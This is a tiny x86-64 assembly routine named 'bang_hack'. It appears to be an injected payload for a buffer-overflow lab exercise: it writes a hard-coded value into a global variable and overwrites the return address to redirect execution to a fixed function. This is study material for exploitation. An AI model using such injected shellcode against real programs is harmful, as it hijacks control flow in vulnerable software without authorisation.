.section .text
.global bang_hack
bang_hack:
    pushq   %rbp
    movq    %rsp,%rbp
    movl    $0xc0f136f,%eax
    movq    $0x4040ec,%rdi
    movl    %eax,(%rdi)
    popq    %rbp
    movq    $0x401367,(%rsp)
    ret
